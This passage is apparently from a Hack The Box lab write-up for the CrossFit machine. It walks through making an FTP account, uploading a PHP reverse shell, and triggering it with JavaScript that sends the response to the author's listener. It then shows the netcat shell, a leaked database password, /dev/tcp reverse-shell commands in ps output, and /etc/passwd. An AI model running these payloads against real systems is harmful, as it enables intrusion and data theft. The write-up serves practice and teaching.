10.10.10.208 - - [15/Jan/2021 21:51:58] "POST /username=test3&amp;pass=p@ssword123&amp;_token=EnEv1a4N27y3dqOO8UpAiGqpr3WuAbAUyoJ5D8at HTTP/1.1" 501 -
10.10.10.208 - - [15/Jan/2021 21:51:58] code 404, message File not found
10.10.10.208 - - [15/Jan/2021 21:51:58] "GET /%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%20%20%20%20%3Ctitle%3EFTP%20Hosting%20-%20Account%20Management%3C/title%3E%20%20%20%20%3Clink%20href=%22https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css%22%20rel=%22stylesheet%22%3E%3C/head%3E%3Cbody%3E%3Cbr%3E%3Cdiv%20class=%22container%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22row%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22col-lg-12%20margin-tb%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-left%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%3EFTP%20Hosting%20-%20Account%20Management%3C/h2%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-right%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22btn%20btn-success%22%20href=%22http://ftp.crossfit.htb/accounts/create%22%3E%20Create%20New%20Account%3C/a%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22alert%20alert-success%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%3EAccount%20created%20successfully.%3C/p%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3Ctable%20class=%22table%20table-bordered%22%3E%20%20%20%20%20%20%20%20%3Ctr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3ENo%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3EUsername%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3ECreation%20Date%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%20width=%22280px%22%3EAction%3C/th%3E%20%20%20%20%20%20%20%20%3C/tr%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ctr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3E1%3C/td%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3Etest3%3C/td%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3E2021-01-15%2002:01:55%3C/td%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cform%20action=%22http://ftp.crossfit.htb/accounts/85%22%20method=%22POST%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22btn%20btn-info%22%20href=%22http://ftp.crossfit.htb/accounts/85%22%3EShow%3C/a%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22btn%20btn-primary%22%20href=%22http://ftp.crossfit.htb/accounts/85/edit%22%3EEdit%3C/a%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type=%22hidden%22%20name=%22_token%22%20value=%22EnEv1a4N27y3dqOO8UpAiGqpr3WuAbAUyoJ5D8at%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type=%22hidden%22%20name=%22_method%22%20value=%22DELETE%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20type=%22submit%22%20class=%22btn%20btn-danger%22%3EDelete%3C/button%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/form%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/td%3E%20%20%20%20%20%20%20%20%3C/tr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/table%3E%20%20%20%20%3C/div%3E%3C/body%3E%3C/html%3E HTTP/1.1" 404 -
</pre></table></code></div></div><p>Got a response on my HTTP server with the parameters I was sending to the server, then again with HTML code of the response. I hoped that it included some kind of way to tell if I had been successful at creating a user.</p><blockquote><p>I went through a few iterations as you can see…at one point I thought that maybe my request was getting rejected because of too simple of a password so I upgraded it. It may or may not have been a typo I found in my script, but I left it anyway just in case.</p></blockquote><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>FTP Hosting - Account Management<span class="nt">&lt;/title&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;br&gt;</span>
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-lg-12 margin-tb"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"pull-left"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;h2&gt;</span>FTP Hosting - Account Management<span class="nt">&lt;/h2&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"pull-right"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"btn btn-success"</span> <span class="na">href=</span><span class="s">"http://ftp.crossfit.htb/accounts/create"</span><span class="nt">&gt;</span> Create New Account<span class="nt">&lt;/a&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"alert alert-success"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;p&gt;</span>Account created successfully.<span class="nt">&lt;/p&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;table</span> <span class="na">class=</span><span class="s">"table table-bordered"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;tr&gt;</span>
            <span class="nt">&lt;th&gt;</span>No<span class="nt">&lt;/th&gt;</span>
            <span class="nt">&lt;th&gt;</span>Username<span class="nt">&lt;/th&gt;</span>
            <span class="nt">&lt;th&gt;</span>Creation Date<span class="nt">&lt;/th&gt;</span>
            <span class="nt">&lt;th</span> <span class="na">width=</span><span class="s">"280px"</span><span class="nt">&gt;</span>Action<span class="nt">&lt;/th&gt;</span>
        <span class="nt">&lt;/tr&gt;</span>
                <span class="nt">&lt;tr&gt;</span>
            <span class="nt">&lt;td&gt;</span>1<span class="nt">&lt;/td&gt;</span>
            <span class="nt">&lt;td&gt;</span>test3<span class="nt">&lt;/td&gt;</span>
            <span class="nt">&lt;td&gt;</span>2021-01-15 02:01:55<span class="nt">&lt;/td&gt;</span>
            <span class="nt">&lt;td&gt;</span>
                <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"http://ftp.crossfit.htb/accounts/85"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"btn btn-info"</span> <span class="na">href=</span><span class="s">"http://ftp.crossfit.htb/accounts/85"</span><span class="nt">&gt;</span>Show<span class="nt">&lt;/a&gt;</span>
                    <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"btn btn-primary"</span> <span class="na">href=</span><span class="s">"http://ftp.crossfit.htb/accounts/85/edit"</span><span class="nt">&gt;</span>Edit<span class="nt">&lt;/a&gt;</span>
                    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"_token"</span> <span class="na">value=</span><span class="s">"EnEv1a4N27y3dqOO8UpAiGqpr3WuAbAUyoJ5D8at"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"_method"</span> <span class="na">value=</span><span class="s">"DELETE"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">class=</span><span class="s">"btn btn-danger"</span><span class="nt">&gt;</span>Delete<span class="nt">&lt;/button&gt;</span>
                <span class="nt">&lt;/form&gt;</span>
            <span class="nt">&lt;/td&gt;</span>
        <span class="nt">&lt;/tr&gt;</span>
            <span class="nt">&lt;/table&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>I decoded the HTML response, then saved it to a file.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/2.9-ftp-user-created.png" alt="" /></p><p>After recreating the webpage from the response, I could see that my account was created successfully! Next I tried to log into the server using FTP.</p><h3 id="port-21---revisited-using-lftp">Port 21 - Revisited (using LFTP)</h3><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/crossfit]
└─$ ftp crossfit.htb
Connected to crossfit.htb.
220 Cross Fit Ltd. FTP Server
Name (crossfit.htb:zweilos): test3
530 Non-anonymous sessions must use encryption.
Login failed.
421 Service not available, remote server has closed connection
</pre></table></code></div></div><p>I tried logging in with FTP, but got an error <code class="language-plaintext highlighter-rouge">530 Non-anonymous sessions must use encryption.</code></p><ul><li><a href="https://unix.stackexchange.com/questions/71525/how-do-i-use-implicit-ftp-over-tls">https://unix.stackexchange.com/questions/71525/how-do-i-use-implicit-ftp-over-tls</a><li><a href="https://superuser.com/questions/623236/simple-command-to-connect-to-ftps-server-on-linux-command-line">https://superuser.com/questions/623236/simple-command-to-connect-to-ftps-server-on-linux-command-line</a></ul><blockquote><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>$ lftp
lftp :~&gt; set ftp:ssl-force true
lftp :~&gt; connect ftp.domain.tld
lftp ftp.domain.tld:~&gt; login &lt;username&gt;
</pre></table></code></div></div><p><strong>NOTE:</strong> If the server is making use of self signed certificates you may need to add this <code class="language-plaintext highlighter-rouge">set</code> as well:</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>lftp :~&gt; set ssl:verify-certificate no
</pre></table></code></div></div></blockquote><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/crossfit]
└─$ lftp                                                                                            1 ⨯
lftp :~&gt; set ftp:ssl-force true
lftp :~&gt; connect ftp.crossfit.htb
lftp ftp.crossfit.htb:~&gt; login test3
Password: 
lftp test3@ftp.crossfit.htb:~&gt; ls
ls: Fatal error: Certificate verification: Not trusted (25:EC:D2:FE:6C:9D:77:04:EC:7D:D7:92:87:67:4B:C3:8D:0E:CB:CE)
lftp test3@ftp.crossfit.htb:~&gt; set ssl:verify-certificate no
lftp test3@ftp.crossfit.htb:~&gt; login test3
Password: 
lftp test3@ftp.crossfit.htb:~&gt; ls
drwxrwxr-x    2 33       1002         4096 Jan 15 21:45 development-test
drwxr-xr-x   13 0        0            4096 May 07  2020 ftp
drwxr-xr-x    9 0        0            4096 May 12  2020 gym-club
drwxr-xr-x    2 0        0            4096 May 01  2020 html
</pre></table></code></div></div><p>Success! I was able to log into FTP with the user I had created. I immediately found four folders.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre>lftp test3@ftp.crossfit.htb:/&gt; ls development-test/
lftp test3@ftp.crossfit.htb:/&gt; ls ftp
-rw-r--r--    1 0        0           35856 May 01  2020 CHANGELOG.md
-rw-r--r--    1 0        0              61 May 01  2020 CREDITS
-rw-r--r--    1 0        0            4497 May 01  2020 README.md
drwxr-xr-x    6 0        0            4096 May 02  2020 app
-rwxr-xr-x    1 0        0            1686 May 01  2020 artisan
drwxr-xr-x    3 0        0            4096 May 01  2020 bootstrap
-rw-r--r--    1 0        0            1586 May 01  2020 composer.json
-rw-r--r--    1 0        0          207564 May 01  2020 composer.lock
drwxr-xr-x    2 0        0            4096 May 02  2020 config
drwxr-xr-x    5 0        0            4096 May 01  2020 database
-rw-r--r--    1 0        0            1034 May 01  2020 package.json
-rw-r--r--    1 0        0            1197 May 01  2020 phpunit.xml
drwxr-xr-x    2 0        0            4096 May 01  2020 public
drwxr-xr-x    6 0        0            4096 May 01  2020 resources
drwxr-xr-x    2 0        0            4096 May 01  2020 routes
-rw-r--r--    1 0        0             563 May 01  2020 server.php
drwxr-xr-x    5 33       0            4096 May 01  2020 storage
drwxr-xr-x    4 0        0            4096 May 01  2020 tests
drwxr-xr-x   44 0        0            4096 May 01  2020 vendor
-rw-r--r--    1 0        0             538 May 01  2020 webpack.mix.js
lftp test3@ftp.crossfit.htb:/&gt; ls gym-club/                          
-rwxr-xr-x    1 0        0           21768 May 04  2020 about-us.php
-rwxr-xr-x    1 0        0           23490 May 04  2020 blog-single.php
-rwxr-xr-x    1 0        0           15024 May 04  2020 blog.php
-rwxr-xr-x    1 0        0           13871 May 11  2020 contact.php
drwxr-xr-x    2 0        0            4096 May 04  2020 css
-rw-r--r--    1 0        0             151 May 04  2020 db.php
drwxr-xr-x    5 0        0            4096 May 04  2020 fonts
-rw-r--r--    1 0        0            3670 May 04  2020 functions.php
-rwxr-xr-x    1 0        0           16800 May 04  2020 gallery.php
drwxr-xr-x    3 0        0            4096 May 04  2020 images
drwxr-xr-x    9 0        0            4096 Apr 30  2020 img
-rwxr-xr-x    1 0        0           36336 May 04  2020 index.php
-rwxr-xr-x    1 0        0            9000 May 12  2020 jointheclub.php
drwxr-xr-x    2 0        0            4096 May 04  2020 js
-rw-r--r--    1 0        0             931 May 04  2020 main.html
-rw-r--r--    1 0        0             410 May 04  2020 readme.txt
-rwxr-xr-x    1 0        0           23878 May 04  2020 schedule.php
drwxr-xr-x    2 0        0            4096 Sep 02  2020 security_threat
drwxr-xr-x    8 0        0            4096 May 04  2020 vendor
lftp test3@ftp.crossfit.htb:/&gt; ls html
-rw-r--r--    1 0        0           10701 Apr 30  2020 index.html
</pre></table></code></div></div><p>Unfortunately the most interesting sounding folder <code class="language-plaintext highlighter-rouge">development-test/</code> was empty.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>lftp test3@ftp.crossfit.htb:/&gt; get gym-club/db.php &gt; gym-db.php
151 bytes transferred                             
lftp test3@ftp.crossfit.htb:/&gt; cd database
cd: Login failed: 530 Login incorrect.
lftp test3@ftp.crossfit.htb:/&gt; login test3
Password: 
</pre></table></code></div></div><p>Annoyingly, the server seemed to delete my user account after a few minutes. I had to recreate it and log in again each time during my enumeration.</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="nv">$dbhost</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
<span class="nv">$dbuser</span> <span class="o">=</span> <span class="s2">"crossfit"</span><span class="p">;</span>
<span class="nv">$dbpass</span> <span class="o">=</span> <span class="s2">"oeLoo~y2baeni"</span><span class="p">;</span>
<span class="nv">$db</span> <span class="o">=</span> <span class="s2">"crossfit"</span><span class="p">;</span>
<span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">mysqli</span><span class="p">(</span><span class="nv">$dbhost</span><span class="p">,</span> <span class="nv">$dbuser</span><span class="p">,</span> <span class="nv">$dbpass</span><span class="p">,</span> <span class="nv">$db</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>In the <code class="language-plaintext highlighter-rouge">/gym-club</code> directory there was a file <code class="language-plaintext highlighter-rouge">db.php</code>. The password I found here unfortunately did not work with the username <code class="language-plaintext highlighter-rouge">crossfit</code> for either SSH or FTP.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>lftp test3@ftp.crossfit.htb:/&gt; ls ftp/database
drwxr-xr-x    2 0        0            4096 May 01  2020 factories
drwxr-xr-x    2 0        0            4096 May 02  2020 migrations
drwxr-xr-x    2 0        0            4096 May 01  2020 seeds
lftp test3@ftp.crossfit.htb:/&gt; ls ftp/database/factories/
-rw-r--r--    1 0        0             876 May 01  2020 UserFactory.php
lftp test3@ftp.crossfit.htb:/&gt; get ftp/database/factories/UserFactory.php 876 bytes transferred in 1 second (876 B/s)
</pre></table></code></div></div><p>In the <code class="language-plaintext highlighter-rouge">ftp/database/factories/</code> folder there was a file called <code class="language-plaintext highlighter-rouge">UserFactory.php</code>.</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

<span class="cd">/** @var \Illuminate\Database\Eloquent\Factory $factory */</span>

<span class="kn">use</span> <span class="nc">App\User</span><span class="p">;</span>
<span class="kn">use</span> <span class="nc">Faker\Generator</span> <span class="k">as</span> <span class="nc">Faker</span><span class="p">;</span>
<span class="kn">use</span> <span class="nc">Illuminate\Support\Str</span><span class="p">;</span>

<span class="cm">/*
|--------------------------------------------------------------------------
| Model Factories
|--------------------------------------------------------------------------
|
| This directory should contain each of the model factory definitions for
| your application. Factories provide a convenient way to generate new
| model instances for testing / seeding your application's database.
|
*/</span>

<span class="nv">$factory</span><span class="o">-&gt;</span><span class="nb">define</span><span class="p">(</span><span class="nc">User</span><span class="o">::</span><span class="n">class</span><span class="p">,</span> <span class="k">function</span> <span class="p">(</span><span class="kt">Faker</span> <span class="nv">$faker</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="p">[</span>
        <span class="s1">'name'</span> <span class="o">=&gt;</span> <span class="nv">$faker</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span>
        <span class="s1">'email'</span> <span class="o">=&gt;</span> <span class="nv">$faker</span><span class="o">-&gt;</span><span class="nf">unique</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">safeEmail</span><span class="p">,</span>
        <span class="s1">'email_verified_at'</span> <span class="o">=&gt;</span> <span class="nf">now</span><span class="p">(),</span>
        <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi'</span><span class="p">,</span> <span class="c1">// password</span>
        <span class="s1">'remember_token'</span> <span class="o">=&gt;</span> <span class="nc">Str</span><span class="o">::</span><span class="nf">random</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span>
    <span class="p">];</span>
<span class="p">});</span>
</pre></table></code></div></div><p>This file contained a password hash, which I loaded into hashcat. It cracked almost instantly to reveal … ‘password’. This was most likely a placeholder.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>lftp test3@ftp.crossfit.htb:/&gt; ls
drwxrwxr-x    2 33       1002         4096 Jan 15 21:45 development-test
drwxr-xr-x   13 0        0            4096 May 07  2020 ftp
drwxr-xr-x    9 0        0            4096 May 12  2020 gym-club
drwxr-xr-x    2 0        0            4096 May 01  2020 html
</pre></table></code></div></div><p>While I was looking at the four main folders’ permissions, I realized that the permissions for <code class="language-plaintext highlighter-rouge">/development-test</code> allowed for writing to the directory.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>lftp test3@ftp.crossfit.htb:/&gt; ls
drwxrwxr-x    2 33       1002         4096 Jan 15 21:45 development-test
drwxr-xr-x   13 0        0            4096 May 07  2020 ftp
drwxr-xr-x    9 0        0            4096 May 12  2020 gym-club
drwxr-xr-x    2 0        0            4096 May 01  2020 html
lftp test3@ftp.crossfit.htb:/&gt; cd dev
cd: Access failed: 550 Failed to change directory. (/dev)
lftp test3@ftp.crossfit.htb:/&gt; cd development-test/
lftp test3@ftp.crossfit.htb:/development-test&gt; put ~/php-reverse-shell.php 
5495 bytes transferred
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>
Using the FTP command `PUT` I was able to upload files.  I used this to upload a PHP backdoor that would send me a reverse shell when executed.

```javascript
//get and run reverse shell
//
var test = "http://development-test.crossfit.htb/php-reverse-shell.php";
var request1 = new XMLHttpRequest();
request1.open('GET', test, false);
request1.send()
var response1 = request1.responseText;

//send response1 to my waiting python http.server 
var request2 = new XMLHttpRequest();
request2.open('GET', 'http://10.10.14.161:8090/' + response1, true);
request2.send()

</pre></table></code></div></div><p>I once again modified my original JavaScript exploit from earlier, this time simply requesting access to my PHP backdoor. I hoped that this would execute the code within and send me a reverse shell. On this one I took a logical leap. I assumed that since each of the other folders was running a virtually hosted web domain that <code class="language-plaintext highlighter-rouge">development-test</code> would be the same (even though there was currently no web page hosted there).</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>10.10.10.208 - - [15/Jan/2021 22:36:59] "GET /test4.js HTTP/1.1" 200 -
</pre></table></code></div></div><p>I received a connection request for my JavaScript code, and Burp, which I had used to send the request, showed that the server was stuck while trying to send me a response. This was good sign as this tends to happen when sending a reverse shell this way.</p><h2 id="initial-foothold">Initial Foothold</h2><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/crossfit]
└─$ script initial-foothold                                                                         1 ⨯
Script started, output log file is 'initial-foothold'.
┌──(zweilos㉿kali)-[~/htb/crossfit]
└─$ bash                                                             
zweilos@kali:~/htb/crossfit$ nc -lvnp 8091
listening on [any] 8091 ...
connect to [10.10.14.161] from (UNKNOWN) [10.10.10.208] 60548
Linux crossfit 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux
 22:51:04 up 2 days,  9:01,  0 users,  load average: 1.78, 2.11, 2.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'   
www-data@crossfit:/$ ^Z
[1]+  Stopped                 nc -lvnp 8091
zweilos@kali:~/htb/crossfit$ stty size
54 104
zweilos@kali:~/htb/crossfit$ stty raw -echo
nc -lvnp 8091aa:~/htb/crossfit$ 

www-data@crossfit:/$ stty rows 54 columns 104
www-data@crossfit:/$ export TERM=xterm-256color
</pre></table></code></div></div><p>After a little bit of waiting, I got a shell back on my waiting netcat listener! The first thing I did was upgrade to a full PTY using Python.</p><blockquote><p>Before starting my netcat listener I did some setup. First I ran the <strong><code class="language-plaintext highlighter-rouge">script</code></strong> command to log all of my commands and output, and I also used <strong><code class="language-plaintext highlighter-rouge">bash</code></strong> because <strong><code class="language-plaintext highlighter-rouge">zsh</code></strong> has a problem (at least on my system, not sure if it is a confirmed bug) where backgrounding the connection and setting <strong><code class="language-plaintext highlighter-rouge">stty raw -echo</code></strong> breaks the shell in a way that I cannot use <strong><code class="language-plaintext highlighter-rouge">enter</code></strong> or control key commands. If anyone has any feedback on this I would appreciate it!</p></blockquote><h3 id="enumeration-as-www-data">Enumeration as <code class="language-plaintext highlighter-rouge">www-data</code></h3><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>www-data@crossfit:/run$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
www-data  6266  0.0  0.0  10748  1204 pts/3    R+   22:56   0:00 ps aux
www-data 15839  0.0  0.2  17056  8284 ?        S    22:52   0:00 python3 -c import pty;pty.spawn("/bin/b
www-data 15866  0.0  0.0   7192  3476 pts/3    Ss   22:52   0:00 /bin/bash
www-data 17149  0.0  0.1  12216  7044 ?        S    17:35   0:00 python -c import pty;pty.spawn("/bin/ba
www-data 17200  0.0  0.0   3868  3216 pts/2    Ss+  17:35   0:00 /bin/bash
www-data 20099  0.0  0.0   2388   696 ?        S    22:51   0:00 sh -c uname -a; w; id; /bin/sh -i
www-data 20109  0.0  0.0   2388   760 ?        S    22:51   0:00 /bin/sh -i
www-data 21211  0.0  0.0   2388   760 ?        S    Mar20   0:00 sh -c bash -c 'bash -i &gt;&amp; /dev/tcp/10.1
www-data 21212  0.0  0.0   3736  2800 ?        S    Mar20   0:00 bash -c bash -i &gt;&amp; /dev/tcp/10.10.14.24
www-data 21213  0.0  0.0   3868  3244 ?        S    Mar20   0:00 bash -i
www-data 21225  0.0  0.2  17056  8256 ?        S    Mar20   0:00 python3 -c import pty;pty.spawn("/bin/b
www-data 21226  0.0  0.0   7060  3464 pts/0    Ss+  Mar20   0:00 /bin/bash
www-data 32120  0.0  0.0   2388   752 ?        S    17:35   0:00 sh -c bash -c 'bash -i &gt;&amp; /dev/tcp/10.1
www-data 32126  0.0  0.0   3736  2908 ?        S    17:35   0:00 bash -c bash -i &gt;&amp; /dev/tcp/10.10.14.22
www-data 32128  0.0  0.0   3868  3220 ?        S    17:35   0:00 bash -i
</pre></table></code></div></div><p>Hmm…<code class="language-plaintext highlighter-rouge">ps</code> showed that this was a busy machine… It looked like I had company (only one of those shells is mine!).</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre>www-data@crossfit:/run<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
